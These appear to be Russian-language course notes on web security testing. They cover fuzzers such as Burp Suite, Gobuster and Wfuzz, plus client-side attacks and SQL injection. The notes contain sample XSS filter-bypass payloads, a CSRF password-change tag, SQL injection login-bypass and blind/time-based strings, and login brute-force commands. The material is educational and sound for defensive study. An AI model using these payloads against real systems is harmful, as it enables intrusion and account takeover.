# 2. Активный фаззинг веб приложений

## Что такое фаззинг веб-приложений

> **Фаззинг (fuzzing)**<br>это метод тестирования безопасности программного обеспечения, основанный на генерации и подаче случайных или специально сформированных данных (тестовых случаев) на вход программы для выявления уязвимостей и ошибок.

Цели фаззинга:
- Выявление уязвимостей, таких как переполнение буфера, SQL-инъекции, XSS и другие.
- Тестирование на устойчивость: как программа реагирует на некорректные или неожиданные входные данные.
- Анализ поведения системы при обработке нестандартных данных.

Как работает фаззинг:
- Генератор тестовых данных (фаззер) создает множество входных значений, включая валидные, случайные и специально измененные данные.
- Эти данные отправляются в целевую программу или систему.
- Фаззер отслеживает реакцию программы, выявляя сбои, зависания, утечки памяти или некорректное поведение.

### три подхода к выявлению недостатков системы

1. **Метод черного ящика**<br>тестирование без знания внутренней структуры программы. Работает только с входными и выходными данными.
    - используется при работе с удаленными веб-сервисами или веб-приложениями
    - данные на входе могут подаваться в виде запросов
    - на выходе получаются какие-то веб-страницы или значения, с которыми и продолжается работа
    - фаззеров для тестирования: [OWASP JBroFuzz.](https://github.com/twilsonb/jbrofuzz)
        - проверки: на межсайтовый скриптинг (XSS), на SQL-инъекции, на переполнение буфера, целочисленное переполнение, пр.
        - работает с самыми популярными сетевыми протоколами: HTTP, SOAP, XML, LDAP и др.
1. **Метод серого ящика**<br>частичный доступ к информации о программе (например, с помощью анализа байт-кода).
    - комбинацию из метода черного ящика и восстановления кода (RCE — reverse code engineering).
    - обратный инжиниринг, позволяющий восстановить функциональную структуру программы на основе ее исполняемых файлов
        - анализ байт-кода, декомпиляцию и изучение поведения программы в различных условиях
1. **Метод белого ящика**<br>полный доступ к исходному коду программы для глубокого анализа.
    - если доступен сам исходный код
        - используются средства проверки на этапе компиляции, браузеры исходного кода и автоматические инструменты проверки исходного кода

### По методу управления данными

делится на два подхода: 
- генерация
- мутация

> **Генерация**<br>это процесс создания данных или информации путем использования случайных или псевдослучайных алгоритмов, которые формируют значения, соответствующие заданным типам или категориям.

Например:
- Для тестирования веб-приложения фаззер генерирует случайные строки и подставляет их в поля ввода формы или параметры URL.
- При тестировании API может быть сформирован произвольный JSON или XML-файл, имитирующий запрос.

> **Мутация**<br>внесения изменений в валидные данные

Примеры мутаций:
- В существующий корректный URL добавляются недопустимые символы: https://example.com/api?name=John<%20Doe.
- В числовые параметры добавляются экстремальные значения, такие как -99999 или 9999999999.
- Текстовые данные могут быть изменены на строки с особыми символами, например, \' OR 1=1--.

позволяет находить более сложные уязвимости, которые связаны с обработкой краевых случаев, таких как переполнение буфера или SQL-инъекции.

## Фазеры разделить по «интеллекту»

### Dummy (dump) фаззеры

- ничего не знает о структуре данных

При тестировании веб-сервиса dummy фаззер генерирует случайные строки для отправки в HTTP-запросы. Это эффективно против уязвимостей вроде XSS, когда некорректные данные просто выводятся на страницу без проверки. Таким образом Dump фаззинг подходит для поиска XSS-уязвимостей, так как он генерирует случайные скрипты и проверяет их выполнение на странице.

### Smart фаззеры

- имеет некоторое представление о структуре данным и может производить манипуляции.

При тестировании REST API smart фаззер понимает структуру JSON-данных и модифицирует параметры запроса с учетом допустимых значений. Например, он может отправить отрицательное значение в поле, ожидающее цену (price: -100) или ввести текст в поле, ожидающее числа. Smart фаззинг часто используется для тестирования протоколов, таких как HTTP/2 или MQTT, где требуется глубокое понимание спецификации для эффективного тестирования.

AFL (American Fuzzy Lop): известный инструмент фаззинга, который работает с исходным кодом и может эффективно находить ошибки благодаря мутациям.

## Активный фаззинг

Активным фаззингом чаще всего называют автоматическое или полуавтоматическое тестирование программ (в нашем случае веб-приложений).

- отправить приложению какие-либо данные (например, заведомо некорректные) и посмотреть, как оно отреагирует
- может быть 
    - тестирование параметров в запросах к web-серверу
    - дирбастинг (перебор директорий или файлов)
    - автоматическое тестирование на такие уязвимости как xxe, cmd injection, sql injection (sqlmap — тоже фаззер)

Примеры инструментов:
- OWASP JBroFuzz
- Burp Suite

# 3. Фазеры 

## Burp Suite

[https://portswigger.net/burp](https://portswigger.net/burp)

> незаменимый инструмент для глубокого тестирования веб-приложений. С ее помощью можно перехватывать и изменять HTTP-запросы, тестируя различные сценарии взаимодействия с приложением.

### работа с утилитой Repeater

После запуска Burp Suite все HTTP-запросы, проходящие через прокси-сервер, автоматически сохраняются во вкладке Proxy → History. Здесь можно просматривать запросы и ответы на них.

Чтобы протестировать определенный запрос
1. выберите его в Proxy → History
1. нажмите правую кнопку мыши и выберите «Отправить в Repeater»
1. Перейдите во вкладку Repeater
    - появится копия выбранного запроса
1. можно вносить изменения в параметры запроса и отправлять его повторно, чтобы проанализировать ответы сервера.

полезен для проверки:
- SQL-инъекции
- межсайтовый скриптинг (XSS)

При настоящем тестировании веб-приложения стоит «погулять» по сайту через браузер, перехватывая все запросы в burp suite.

есть утилита для автоматического фаззинга — Intruder. Она предназначена для автоматизации тестирования веб-приложений на уязвимости. Его основное назначение — выполнение атак на выбранные параметры HTTP-запросов, такие как ввод данных, заголовки или cookies.

## Gobuster

> **Перебор директорий (брутфорс)**<br>это тоже фаззинг. В качестве программы для фаззинга директорий мы советуем использовать Gobuster.

- многопоточность
- простой интерфейс (unix-like интерфейс)
- возможность точной настройки

```bash
apt-get install gobuster
```
Gobuster не предоставляет словарей для брутфорса директорий из коробки. Поэтому придется скачать их отдельно. В Kali Linux есть словари директорий в `/usr/share/dirb/wordlists и /usr/share/dirbuster/wordlists`.

Словари директорий:

- `directory-list-2.3-medium.txt` — достаточно хороший словарь, чтобы использовать его в реальных тестах.

```bash
mkdir wordlists

wget https://raw.githubusercontent.com/zaproxy/zap extensions/master/src/org/zaproxy/zap/extension/directorylistv2_3/ files/fuzzers/dirbuster/directory-list-2.3-small.txt -O directory list-2.3-small.txt

wget https://raw.githubusercontent.com/zaproxy/zap extensions/master/src/org/zaproxy/zap/extension/directorylistv2_3/ files/fuzzers/dirbuster/directory-list-2.3-medium.txt -O directory-list-2.3-medium.txt

wget https://raw.githubusercontent.com/zaproxy/zap extensions/master/src/org/zaproxy/zap/extension/directorylistv2_3/ files/fuzzers/dirbuster/directory-list-2.3-big.txt -O directory list-2.3-big.txt
```

Опции запуска Gobuster:
- `-u` задает URL-адрес сайта или IP-адрес сервера.
- `-w` указывает путь к словарю (списку слов), с помощью которого будет выполняться перебор.
- `-t` задает количество потоков для ускорения перебора.
- `-s` ограничивает отображаемые HTTP-ответы сервера по их статусам (например, 200 — успешно, 403 — доступ запрещен и т.д.).

По умолчанию Gobuster отображает ответы 200, 204, 301, 302, 307 и 403.

Ответ (access denied) тоже стоит учитывать, так как это может помочь в фингерпринтинге веб-приложения.

Ответы, такие как 403 Forbidden, могут быть индикатором того, что на сервере существуют защищенные ресурсы. Анализируя их, можно идентифицировать интересные файлы или директории. Например, наличие файла server-status на сервере Apache, доступ к которому обычно ограничен, может быть полезно для сбора информации о конфигурации сервера или других технических деталей.

### rip-git

- Если веб-сайт использует Git для контроля версий, но неправильно настроена конфиденциальность, можно обнаружить папку .git.
- При попытке доступа сервер часто возвращает ответ 403 Forbidden, указывая на наличие папки.
- Используя утилиту rip-git, злоумышленник может попробовать восстановить содержимое репозитория, что даст доступ к исходному коду, паролям, токенам и другой важной информации.

### Опция -x в gobuster

- Функция позволяет добавлять расширения к словарным данным, например .php, .bak, .zip.
- Это полезно для поиска файлов определенного типа, таких как скрипты PHP, резервные копии (backup.bak), архивы (data.zip).
- Например, перебор может выявить файлы вроде index.php или config.bak, которые могут содержать конфиденциальные данные.

То есть гит-репозиторий можно попробовать выкачать с помощью утилиты rip-git. С помощью функции -x можно добавлять расширения файлов к словарным данным. Так мы сможем нацелено находить php-файлы, или бекапы с расширением .bak

## FuzzDB

> коллекция текстовых файлов, содержащих шаблоны для тестирования безопасности приложений. Все данные в ней структурированы и разделены по назначению.

<https://github.com/fuzzdb-project/fuzzdb>

```bash
git clone https://github.com/fuzzdb-project/fuzzdb.git
```

основные категории данных:
1. **Популярные пути файлов и директорий**<br>включает расположения логов, конфигурационных файлов и других важных ресурсов, которые могут быть интересны злоумышленнику.
1. **Шаблоны атак**<br>строки, которые можно отправить приложению для выявления ошибок или исключений.
1. **Шаблоны ответов**<br>помогают определить наличие уязвимостей по ответам приложения.
1. **Дополнительные инструменты**<br>коллекция web-шеллов для разных платформ, словари для брутфорса и многое другое.
1. **Документация**<br>описания использования шаблонов и их назначения.

FuzzDB основан на данных известных проектов, таких как jBroFuzz (OWASP), wapiti, SPIKE, а также собственных исследованиях автора.

Это, по сути, просто набор текстовых файлов, которые можно использовать в инструментах вроде Burp Suite, кастомных сканерах веб-директорий и других профессиональных инструментах для пентестов.

## SecLists

> еще одна полезная база данных для фаззинга и тестирования безопасности

<https://github.com/danielmiessler/SecLists>

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

Она включает:
- Словари с популярными логинами, паролями, именами файлов и директорий.
- Шаблоны для поиска уязвимостей, таких как SQL-инъекции (SQLi), XSS, LFI и других.

Эти списки помогут ускорить процесс тестирования, поскольку вам не нужно составлять свои словари с нуля.

## Wfuzz

> огромный фреймворк для фаззинга веб-приложений, включающий себя API на питоне (сам Wfuzz тоже написан на питоне), прикладные утилиты (например `wfpayload` для генерации полезных нагрузок), и сам фаззер, к которому, кстати, можно подключать плагины.

```bash
pip install Wfuzz
```

С помощью этой утилиты можно фаззить буквально все веб приложение: параметры GET, POST и прочих запросов, тело запроса, куки, директории сайта и т.д.

### Фаззинг директорий, файлов и параметров в url 

```bash
wfuzz -z file,wordlists/directory-list-2.3-medium.txt
```

- Ключевое слово FUZZ будет заменяться на полезную нагрузку в процессе фаззинга.
- Это довольно гибкое решение, так как мы можем подставлять FUZZ в любое место запроса.
- Параметр `--hc 404` указывает, что нужно пропускать все ответы 404 (страница не найдена)

| Параметр (ключ) | Описание |
| :------------ | :--------- |
| `--hc` | не показывать ответы с указанным кодом ответа; |
| `--hl` | не показывать ответы с указанным количеством строк; |
| `--hw` | не показывать ответы с указанным количеством слов; |
| `--hw` | не показывать ответы с указанным количеством символов; |
| `--sc` | показывать ответы только с указанным кодом; |
| `--sl` | показывать ответы только с указанным количеством строк; |
| `--sw` | показывать ответы только с указанным количеством слова; |
| `--sh` | показывать ответы только с указанным количеством символов. |
| `-z file`<br>`/file/path`<br>`-w путь_до_файла` | Полезная нагрузка |

с помощью range можно сделать список из чисел, что удобно при поиске рабочих параметров в url:

```bash
wfuzz -c -z range,0-10 --hc 404 http://example.com/index.php?id=FUZZ
```

Полный список полезных нагрузок можно посмотреть с помощью команды:

```bash
wfuzz -e payloads
``` 

### Фаззинг POST-запросов

В параметре `-d` указывается тело запроса с ключевым словом FUZZ в месте фаззинга

```bash
wfuzz -z file,common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://example.com/login.php
```

### Фаззинг Куки

Куки указываются через параметр `-b`, каждое значение отдельно

```bash
wfuzz -z file,common.txt -b cookie1=FUZZ -b cookie2=value2 http://example.com/index.php
```

Wfuzz будет генерировать такие http-запросы:

```
GET /index.php HTTP/1.1 
Host: example.com 
Accept: */* 
Content-Type: application/x-www-form-urlencoded Cookie: cookie1=FUZZ; cookie2=value2 
User-Agent: Wfuzz/2.2.11 12 
Connection: close 
```

Где вместо FUZZ будут подставляться значения из словаря.

### Фаззинг Хедеров

Можно добавлять свои хедеры в запрос, а также изменять уже существующие. В параметр `-H` указываются данные в формате «хедер: значение».

```bash
wfuzz -z file,headers.txt -H "myheader: FUZZ" -H "User-Agent: Googlebot-News"
```

```bash
http://example.com/ 
Запрос к серверу будет таким: 
GET / HTTP/1.1 Host: example.com 
Accept: */* 
Content-Type: application/x-www-form-urlencoded 
myheader: FUZZ 
User-Agent: Googlebot-News
Connection: close
```

### Кодировка

позволяет кодировать значения из словаря перед отправкой на сервер. Для в параметре `-z` после указания типа итератора (файл, последовательность, стандартный ввод stdin и т. д.) и самого итератора, через запятую указывается тип кодировки

```bash
wfuzz -u example.net/main.php?page=FUZZ -z file,wordlists/common.txt,base64 --sw 40
```

Полный список возможных способов кодирования с описанием можно посмотреть, введя команду

```bash
wfuzz -e encoders
```

Кодировки можно применять по цепочке, разделяя их знаком -, тогда wfuzz будет по очереди кодировать и отсылать на сервер полезную нагрузку с разными кодировками.

```bash
wfuzz -u "http://example/main.php?page=FUZZ" -z list,just_one_payload,none base64-md5
```

# 4. Клиентские атаки

> атаки, нацеленные на взаимодействие пользователя с веб-приложением. Они эксплуатируют уязвимости браузеров, клиентских скриптов или механизмы обработки пользовательских данных. В отличие от атак на сервер, клиентские атаки воздействуют на ту часть приложения, с которой взаимодействует конечный пользователь.

Почему важно изучать клиентские атаки?

1. **Рост сложности клиентской части**<br>современные приложения полагаются на сложные фронтенд-архитектуры и сторонние библиотеки, что увеличивает риск появления уязвимостей.
1. **Цель атаки — пользователь**<br>данные пользователей — это ключевая цель. Злоумышленники используют клиентские атаки, чтобы перехватить информацию, выдать себя за пользователя или заразить устройства вредоносным кодом.
1. **Частота атак**<br>такие векторы как XSS (межсайтовый скриптинг) и CSRF (подделка межсайтовых запросов) входят в число наиболее распространенных уязвимостей по данным OWASP.

В этом юните мы рассмотрим следующие типы атак:
1. **XSS (Cross Site Scripting)**<br>основы межсайтового скриптинга, основные типы атак (Reflected, Stored, DOM) и практические примеры.
1. **DOM XSS**<br>анализ атак, связанных с манипуляцией объектной моделью документа в браузере.
1. **Bypass XSS filter**<br>методы обхода фильтров XSS, используемых для защиты веб-приложений.
1. **CSRF (Cross-Site Request Forgery)**<br>механика подделки межсайтовых запросов и способы противодействия.
1. **Open Redirect**<br>эксплуатация уязвимостей перенаправления на сторонние ресурсы и их риски для пользователей.
1. **Client Side Template Injection**<br>атаки на шаблонизаторы, выполняемые на стороне клиента, и их последствия.
1. **Bypass CSP**<br>обход политики безопасности контента (Content Security Policy) для проведения клиентских атак.
1. **Clickjacking**<br>манипуляции с пользовательским интерфейсом для перехвата действий или перенаправления пользователей.

## Clickjacking

> метод обмана пользователя

- Злоумышленник создает страницу сайта с невидимым слоем, который может занимать всю страницу или определенную ее часть. 
- Например, этот слой может располагаться поверх конкретной кнопки сайта
- После этого жертву перенаправляют на такой сайт
- Когда пользователь кликает по видимой области страницы, он фактически нажимает на невидимый слой, что приводит к выполнению кода злоумышленника

Используется для:
- Этот метод часто используется для продвижения рекламы.
- Метод позволяет красть конфиденциальную информацию, в том числе cookies или пароли, а также давать доступ к компьютеру
- похищение клика

## XSS (Cross Site Scripting) (межсайтовый скриптинг)

> осуществляется посредством внедрения вредоносного кода со стороны клиента в выдаваемую веб-страницу. После чего на компьютере всех, кто запросит эту страницу, будет выполнен вредоносный код.

![ci](./imgs/mod3_4_xss.png)

две большие подгруппы:
- **хранимые**
    - Пример хранимой XSS представлен выше, т.е. это атака, позволяющая выполнять вредоносный код каждый раз при обращении к вредоносной странице сайта
- **отраженные**
    - злоумышленники могут выполнить вредоносный код, используя скрипты сайта в момент взаимодействия пользователя со страницей
    - этот код не сохраняется на сервере и, следовательно, недоступен для других пользователей
    - злоумышленники создают специально сформированную уязвимую ссылку и передают ее жертве, чаще всего через электронную почту

![alt text](./imgs/mod3_4_xss_reflect.png)

## DOM XSS

> Тип атаки через **DOM (Document Object Model)** отличается от остальных тем, что не основан на внедрении вредоносного кода как такового, а осуществляет воздействие непосредственно на объект DOM страницы.

Существует два вида XML парсеров:
- **SAX(Simple API for XML)**
    - основан на генерации событий для каждого элемента XML документа
- **DOM**
    - сначала загружает весь документ, а потом работает с ним как с единым целым

Функции, которые могут быть использованы для атаки, следующие:

| Функция | Описание |
| :--- | :--- |
| `document.write` | уже описана выше; |
| `document.writeln` | аналогична функции выше, только добавляется знак перевода каретки; |
| `document.body.innerHTML` | эта функция позволяет полностью изменить содержимое элемента body; |
| `document.forms[0].action` | воздействие на формы страницы; |
| `[document/window].attachEvent` | метод обработки событий на странице; |
| `document.createElement` | добавление новых элементов на страницу; |
| `document.execCommand` | позволяет использовать функции управления контентом; |
| `document.location` | возвращает объект Location и используемые им методы; |
| `document.URL` | возвращает URL как строку; |
| `window.navigate` | загрузка в текущее окно из источника; |
| `[document/window].open` | открывает документ для записи; |
| `document.execScript` | выполнение скрипта во время формирования документа; |
| `document.[setTimeout/setInterval]` | определенный промежуток времени; |
| `eval` | выполняет код, переданный в виде строки. |

Это основные функции, на которые стоит обращать внимание, и которые потенциально могут быть источниками DOM XSS.

## Bypass XSS filter

- самая популярная атака на веб-приложения, от которой разработчики пытаются всячески защититься

Помимо основной защиты политик SOP, CSP и подобных, разработчики фильтруют данные, полученные пользовательским вводом. При этом методы выбираются такие же, как и для других подобных разделов, описанных в предыдущих уроках. Соответственно и методы обхода фильтров аналогичные.

- зменение регистра букв или изменение кодировок символов:<br>`%3CScrIpT%3Ealert%28%27XSS%27%29%3B%3C%2FScrIpT%3E`
- Манипулирование тегами, аналогично применению кавычки в SQL-инъекции:<br>`#"><img src=x onerror=prompt('XSS')>`
- Или просто подключение javascript файл с вашего сервера:`<script src="http://site/js.js"></script>`

Основной список с возможными нагрузками будет предоставлен в отдельном файле. Также стоит ознакомиться с [этим ресурсом](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet), где все подробно описано.

## Какие возможности предоставляет XSS

Обычно на такой вопрос дают ответ: XSS может сделать все, что может сделать JavaScript. Если говорить конкретнее, то возможно следующее:
- Похищение cookie (самое распространенное);
- Перехват ввода логина/пароля;
- Самое безобидное — дефейс («тут был hacker1337»);
- Перехват управления;
- Просмотр веб-камеры пользователей;
- DDOS атака.

## CSRF

> **CSRF (Cross Site Request Forgery)**<br>межсайтовая подделка запроса. Суть заключается в том, чтобы заманить пользователя на вредоносный сайт, который выполнит от имени пользователя запрос на другой, где этот пользователь авторизован.

Представим такую ситуацию. Пользователь зашел на форум http://forum.com/login пообщаться. Ввел логин и пароль. Ему выдалась сессия и куки. Далее злоумышленник присылает ему на форуме сообщение со ссылкой: http://evilSite.com/threads/34/post#1.

Сайт в ссылке является вредоносным и содержит следующий тег:

```html
<img src="http://forum.com/account/changes/password/?new=myNewPassword">
```

Данная ссылка запрашивает изменение пароля у пользователя на тот, что указан в параметре new. Так как у пользователя открыта на форуме сессия и есть сохраненные куки, то злоумышленник меняет пароль пользователя на свой. Возможности этой атаки ограничены правами пользователя и самим веб-сервисом, но помимо описанного выше случая благодаря CSRF можно отправлять письма от лица пользователя, узнавать секретные вопросы для восстановления пароля, добавлять новых пользователей на сервис, если позволяют права. Так же полезно применять атаку совместно с XSS атакой, описанной ранее. Стоит отметить, что в реальности эту атаку довольно сложно осуществить. Все дело в том, что обычно проверяется не только авторизация пользователя в сервисе, но и данные передаваемые им. Осуществляется это благодаря CSRF токенам.

## Bypass CSP

> **CSP (Content Security Policy)**<br>это политика защиты контента. Она дополняет SOP и призвана предотвращать атаки с внедрением кода, а именно XSS. Принцип работы практически такой же, как и при выдаче прав пользователю в БД SQL. Только в случае CSP указываются директивы, в которых устанавливаются правила использования встроенных стилей, правила оценки скриптов, ограничение загрузки со сторонних ресурсов, ведется проверка по белому списку.

Список некоторых директив:
- **default-src**<br>используется, если какая-то из директив не указана;
- **script-src**<br>контролирует набор привилегий для скрипт текущей страницы, другими словами, откуда можно подключать скрипты;
- **object-src**<br>контроль плагинов (Java, Flash, etc);
- **style-src**<br>аналогично как для script-src, только относится уже к стилям;
- **img-src**<br>указывает, с каких ресурсов можно подгружать картинки;
- **media-src**<br>аналогично img-src, только для медиа контента (аудио и видео);
- **frame-src**<br>контролирует разрешенные источники для iframe на странице;
- **font-src**<br>контролирует источники шрифтов;
- **connect-src**<br>ограничивает возможные подключения со страницы.

Использование CSP выглядит так:<br>![alt text](./imgs/mod3_4_csp.png) 

В заголовке прописывается «Content-Security-Policy», а потом перечисляются директивы и источники через пробел.

Например, в примере выше используются 4 директивы:
1. Подключение шрифтов разрешено, только с самой страницы и сайта http://mySiteFonts.com.
1. iframe полностью запрещены.
1. Подключения разрешены только на поддомены сайта myStie.com.
1. Скрипты подключаются только со страницы.

Теперь, если злоумышленник попытается загрузить вредоносный скрипт со своего сервера, то получит ошибку вида:<br>![alt text](./imgs/mod3_4_csp2.png) 

Если говорить совсем просто, то CSP основано на белых списках. Так как же возможно обходить эти ограничения?

Допустим, CSP имеет следующие настройки:<br>`Content-Security-Policy: script-src 'self' someValidSite.com anotherSite.ru`

Эта настройка говорит о том, что, помимо своих скриптов, на страницу разрешено подгружать скрипты с доверенных источников: someValidSite.com и anotherSite.ru

Если на одном из доверенных источников обнаружена уязвимость XSS (например, отраженная), это открывает путь для обхода CSP.

Пример отраженной XSS:<br>`http://anotherSite.ru/char/help.php?message=<script>alert('xss');</script>`

Если же есть возможность загрузки готового JavaScript-кода на доверенный ресурс, то задача становится еще проще:<br>![alt text](./imgs/mod3_4_csp3.png) 
Если источники для скриптов ограничены только исходным сервером:<br>`Content-Security-Policy: script-src 'self'`

## Client Side Template Injection (CSTI)

> инжектирование в шаблон, которое выполняется на стороне клиента. При CSTI мы можем добиться выполнения JavaScript кода или, проще говоря, провести XSS. Опасность уязвимостей, связанных с внедрением шаблонов на стороне клиента, во многом зависит от природы уязвимого приложения. Она определяется типами обрабатываемых данных, функциональными возможностями приложения, а также наличием других приложений, работающих в рамках того же домена или принадлежащих одной организации.

Если приложение используется только для отображения статического контента без функций аутентификации или контроля доступа, то данную уязвимость можно рассматривать как **«низкий риск»**.

Однако если приложение находится в домене, который может получить доступ к файлам cookie для других приложений, более критичных для безопасности, уязвимость может быть использована для атаки на эти приложения. Такая уязвимость рассматривается как **«высокий риск»**.

Точно так же обстоят дела, если вероятной целью фишинговых атак является организация, которой принадлежит приложение. Уязвимость может быть использована для придания правдоподобности таким атакам путем внедрения троянских функций в уязвимое приложение. Используя доверие пользователей к организации, легко собрать учетные данные для других, принадлежащих ей приложений. Во многих видах приложений, например в тех, которые предоставляют функциональные возможности онлайн-банкинга, внедрение шаблонов на стороне клиента всегда должно рассматриваться как высокий риск.

Клиентские каркасы шаблонов часто реализуют изолированную программную среду (песочницу), предназначенную для предотвращения прямого выполнения JavaScript кода из выражения шаблона. Однако эти песочницы не предназначены для контроля безопасности и обычно могут быть обойдены. Фильтры межсайтовых скриптов в браузерах, как правило, не могут обнаружить или предотвратить атаки с использованием шаблонов на стороне клиента.

## OpenRedirect

> это уязвимость, возникающая, когда веб-приложение принимает пользовательский ввод для указания ссылки на внешний сайт и использует его для выполнения перенаправления (Redirect). Это упрощает фишинговые атаки.

- Параметр http содержит значение URL-адреса и приводит к тому, что веб-приложение перенаправит запрос на указанный URL-адрес
- Изменив значение URL-адреса на вредоносный сайт, злоумышленник может успешно запустить фишинговую аферу и украсть учетные данные пользователя
- Поскольку имя сервера в измененной ссылке совпадает с исходным сайтом, попытки фишинга выглядят очень достоверно.

Пример уязвимой ссылки на веб-сайт выглядит примерно так:<br>![alt text](./imgs/mod3_4_openredirect.png)

В этом примере параметр «RelayState» указывает, куда отправить пользователя при успешном входе в систему (в нашем примере это http://fishing.com/next). Если веб-сайт не проверяет значение параметра «RelayState», чтобы убедиться, что целевая веб-страница является безвредной, злоумышленник может изменить этот параметр, чтобы отправить жертву на поддельную страницу.

Одним из основных способов использования этой уязвимости является повышение вероятности и эффективности фишинговых атак
- жертва получает электронное письмо с правдоподобной ссылкой на правильный и ожидаемый домен

Скачать сканнер для поиска уязвимостей OpenRedirect: [Oralizer](https://github.com/r0075h3ll/Oralyzer).

# 5. Серверные атаки

> **Серверные уязвимости**<br>это ошибки или недочеты в реализации серверной части, которые позволяют злоумышленникам получить несанкционированный доступ, манипулировать данными или нарушать работу приложения. Эти уязвимости эксплуатируют интерфейсы взаимодействия, такие как SQL-запросы, обработчики файлов или настройки доступа.

Почему важно изучать серверные уязвимости?
1. **Частота атак**<br>по данным OWASP, уязвимости серверной части, такие как SQL-инъекции или небезопасная десериализация, остаются в топе угроз.
1. **Масштаб последствий**<br>атаки на сервер влияют на всех пользователей системы, что делает их особенно опасными.
1. **Комплексность защиты**<br>серверные атаки могут эксплуатировать множество векторов, таких как базы данных, API, настройки серверов и инфраструктурные элементы.

## SQL-инъекции

> внедрение в данные произвольного SQL-кода. Если произвольная SQL команда выполняется, то код уязвим и с базой данных можно творить все что угодно.

### Виды SQL-инъекций

SQL-инъекции возникают в местах, где есть входящие данные, и эти входящие данные никак не фильтруются. Исходя из этого, можно понять, что в большинстве случае найти SQL-инъекции очень легко. Просто пробуем все возможные поля и параметры, используя одинарные или двойные кавычки.

#### 1. По типу переменной

##### Числовой параметр

В этом случае параметр не обрамлен кавычками

```sql
SELECT * FROM articles WHERE id = $id.
```

Подставив лишнюю кавычку, можно увидеть такую ошибку:<br>`mysql_query(): You have an error in your SQL syntax check the manual that corresponds to your MySQL server version for the right syntax to use near '1''.`

Если этой ошибки нет, может быть 3 варианта:
- кавычки фильтруются;
- вывод ошибок выключен, т.е. есть слепая инъекция;
- инъекции нет.

Если отчет об ошибках выключен, то можно к запросу добавить знак — и вывод будет таким же, как в начале.

##### Строковый параметр

Параметр обрамлен кавычками. И если добавить кавычку, то запросы будут выглядеть таким образом

```sql
SELECT * FROM articles WHERE id='1''
```

Это означает, что синтаксис и логика SQL-запроса нарушены, и будет ошибка: `mysql_query(): You have an error in your SQL syntax check the manual that corresponds to your MySQL server version for the right syntax to use near '1''.`

А если отчет об ошибках выключен, то можно добавить `'1-`, и ответ будет такой же, как в начале (-- после двух тире, все, что идет дальше в запросе, отбрасывается).

##### Авторизация

В этом случае уязвимыми могут быть два поля — поле login или pass.

При наличии уязвимости можно авторизоваться, имея только login. Например, изначальный запрос выглядит так:

```sql
SELECT * FROM users WHERE login='admin' AND pass='password'
```

И теперь в параметр `login` можно передать `аdmin' --`, запрос будет теперь выглядеть так:

```sql
SELECT * FROM users WHERE login='admin' -- ' AND pass='password' 
```

Все, что идет после `аdmin`, отбрасывается.

В случае, если уязвимость в параметре pass, то можно отправить:

```sql
password' OR login='admin' -- 
```

И такой запрос будет идентичен, он позволит авторизоваться.

```sql
SELECT * FROM users WHERE (login='Admin' AND pass='123') OR (login='Admin')
```

##### Оператор LIKE

Этот оператор в SQL служит для сравнения строк. В таком случае доступ через авторизацию можно получить, даже если нет инъекции. Вместо пароля нужно просто ввести '%', для оператора LIKE знак процента соответствует любой строке, и запрос будет выглядеть так:

```sql
SELECT * FROM users WHERE login LIKE 'admin' AND password LIKE '%' 
```

И произойдет авторизация с логином admin.

#### 2. По типу SQL-инъекций

##### Union-based

Этот тип встречается чаще всего. Команда UNION объединяет два запроса в один. И таким образом позволяет злоумышленнику вывести информацию из любой таблицы в базе данных.

Например, таким запросом:

```sql
"-1 UNION SELECT 1, database()" 
```

определяют количество столбцов в таблице, и на месте вывода второго столбца выводится имя базы данных. Таким же образом можно вывести любое содержимое и другую полезную информацию.

##### Error-based

В случае, если командой UNION не получается получить данные, прибегают к типу error-based. Используя данный тип, данные из базы можно вывести, искусственно вызывая ошибки. Например, с помощью запроса:

```sql
SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY MID(VERSION(), FLOOR(RAND(33)*2), 64) 
```

В отчете ошибки выведется:<br>`Duplicate entry '5.5.25-log' for key 'group_key'`

##### Blind-based

Если данные из базы данных не получается вывести с помощью UNION, а также не выводится никаких ошибок, то, скорее всего, это слепая инъекция. В этом случае остается только один вариант — получать информацию с помощью false и true. Т.е. если ответ пустой, то значит false, если непустой — то true.

В таком случае информация из базы данных достается посимвольно, например с помощью таких команд:

```sql
id=1' and Ascii(substring((Select user()),1,1))>97 --. 
```

Но поскольку проверка каждого символа вручную занимает много времени, обычно используется скрипт, который автоматически извлекает информацию посимвольно. Альтернативой является использование утилиты sqlmap, которая автоматизирует этот процесс. Такой метод извлечения данных называется бинарным поиском.

##### Time-based

Этот вид инъекции достаточно сложен, и определить ее наличие непросто. Ни один из ранее описанных методов в данном случае не работает. Но и здесь есть выход — это использование временных задержек. Например:

```sql
id=1' and if (Ascii(substring((Select user()),1,1))>97, sleep(10),0) --.
```

Принцип работы аналогичен Blind-based инъекциям: сервер отвечает с задержкой в 10 секунд, если условие истинно (true), иначе выполняется сразу (false).

![alt text](./imgs/mod3_5_blindbased.png)

### Union based sql injection

`UNION` based sql является самой простой и распространенной инъекцией. Из названия понятно, что данный тип использует ключевое слово `UNION` при эксплуатации.

Использование `UNION` позволяет объединять результат нескольких запросов в одну таблицу. В общем виде использование `UNION` выглядит так

```sql
<запрос 1> UNION [ALL] <запрос 2> UNION [ALL] <запрос 3> ...
```

- `<запрос N>` — это обычный sql запрос. Например: 
```sql
SELECT id, user FROM users WHERE id = 1.
```
- `UNION [ALL]` — само ключевое слово, где `[ALL]` — необязательный аргумент, который говорит, использовать ли дублирующие записи в результирующей таблице. Особое внимание надо уделить двум моментам:
    - У всех запросов, объединяющих `UNION`, должно быть одинаковое количество столбцов в запросе
        - если <запрос 1> = `SELECT id, user FROM users WHERE id = 1`
        - то и <запрос 2> = `SELECT user, passwd FROM passwds WHERE id = 1`
    - У всех запросов, объединяющих `UNION`, должно быть полное совпадение типов столбцов.

Другими словами, если мы возьмем пример из пункта 1, то тип поля «id» должен совпадать с типом поля users из второго запроса. Соответственно тип «users» из первого запроса должен совпадать с типом «passwd» из второго.

### Blind sql Injection

> **Blind sql injection или слепая sql-инъекция**<br>это тип, при котором нельзя увидеть ответы ошибок на странице.

Различают два вида слепых sql инъекций:
- **Normal blind**<br>нельзя увидеть ответ на странице, но его можно определить из анализа http.
- **Totally blind**<br>никакой разницы в результате в любом виде. При эксплуатации normal blind чаще всего используют IF и различные варианты WHERE. А для эксплуатации totally blind используют специальные функции с целью анализа времени при отправке запроса, и называют это time base sql injection.

